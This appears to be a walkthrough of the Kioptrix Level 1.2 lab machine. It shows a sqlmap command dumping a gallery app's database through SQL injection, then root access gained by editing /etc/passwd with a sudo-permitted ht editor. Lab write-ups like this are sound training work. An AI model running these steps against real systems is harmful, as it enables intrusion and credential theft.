KIOPTRIX: LEVEL 1.2 is a machine in which I used SQL Injection to get useres credintials to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.

## Scanning
As always, I started scanning with Nmap

```
root@kali:/home/kali# nmap -sV -sC -p- 192.168.198.143
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-27 21:03 EDT

```
A Normal HTTP and SSH Services
## HTTP Services 
So First I tried to browse the website and found a suspicous URL. And Adding the single quotation giving me a MySQL error so it's vulnerable to SQL Injection.
```
http://192.168.198.143/gallery/gallery.php?id=1&sort=photoid#photos
```

## SQL Injection
So Imeditatly I ran SQLMAP to exploit, dump database and evnatioly crack the hashes found in the database.
```
sqlmap -u 192.168.198.143/gallery/gallery.php?id=1 --dump
```

Then I ssh'd to user loneferret.

## Privilege Escalation 
I ran diffreent Enumeration scripts and found an intersting sudo privileges.

```
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```
The su binary path is wrong and it has ! mark. The ht binary is a text and hex editor so I had many ideas in this case.

1. Read /etc/shadow and get root hash then crack it with john (SUCCESS)
2. Write in /etc/passwd a new user with root privliges (SUCCESS)
3. Write in /etc/sudoers and change the su binary path (SUCCESS)

But first I had to fix some errors

```
loneferret@Kioptrix3:~$ sudo ht
Error opening terminal: xterm-256color.
loneferret@Kioptrix3:~$ export TERM=xterm
```

Then i opened /etc/passwd and added yoyo -root- user.

![Username](/assets/machines/vulnhub/KL12/2.png)

Then I logged in using ssh to the created user.
```
kali@kali:~$ ssh yoyo@192.168.198.143
yoyo@192.168.198.143's password:

Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intended for everyone. 
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.

I hope you enjoyed this third challenge.

Gallery application: 
Gallarific 2.1 - Free Version released October 10, 2009

Vulnerable version of this application can be downloaded
from the Exploit-DB website:

Also, all pictures were taken from Google Images, so being part of the
public domain I used them.

```
and voila here is the root privilege!
